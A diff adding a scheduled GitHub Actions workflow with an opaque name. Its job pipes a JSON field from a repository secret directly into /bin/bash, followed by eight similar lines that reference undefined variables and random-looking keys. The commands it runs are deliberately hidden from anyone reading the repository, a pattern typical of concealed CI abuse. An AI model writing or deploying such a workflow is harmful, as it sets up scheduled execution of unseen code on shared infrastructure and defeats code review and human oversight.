@@ -1,0 +1,25 @@
+name: minzhucongmeipao
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: minzhucongmeipao
+        env:
+          j5699: ${{ secrets.j5699 }}
+        run: |
+          echo $j5699 | jq -r .nuwf09685 | /bin/bash
+          echo $ptgf396 | jq -r .nw945 | /bin/bash
+          echo $n08764 | jq -r .txlt5 | /bin/bash
+          echo $gus63963 | jq -r .kesl3729 | /bin/bash
+          echo $hrj7 | jq -r .fb0 | /bin/bash
+          echo $ysfll472 | jq -r .ndgyu3 | /bin/bash
+          echo $vzla145 | jq -r .wic50 | /bin/bash
+          echo $m83 | jq -r .niqb2 | /bin/bash
+          echo $rh66 | jq -r .acde52 | /bin/bash
+
